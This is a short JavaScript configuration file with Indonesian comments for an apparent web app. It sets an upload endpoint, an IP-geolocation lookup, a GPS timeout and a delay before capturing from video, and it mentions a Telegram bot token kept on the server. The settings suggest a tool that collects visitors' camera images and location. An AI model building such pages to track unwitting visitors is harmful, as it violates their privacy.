// Konfigurasi client-side.
// TIDAK ADA token/secret di sini — token Telegram tetap di server.py.

window.APP_CONFIG = {
  // Endpoint upload di server kamu
  uploadUrl: window.location.origin + "/upload",

  // Endpoint IP info (opsional, untuk deteksi kota via IP)
  ipInfoUrl: "https://ipapi.co/json/",

  // Timeout permintaan GPS (ms)
  gpsTimeout: 10000,

  // Jeda sebelum capture setelah video siap (ms)
  captureDelay: 800
};
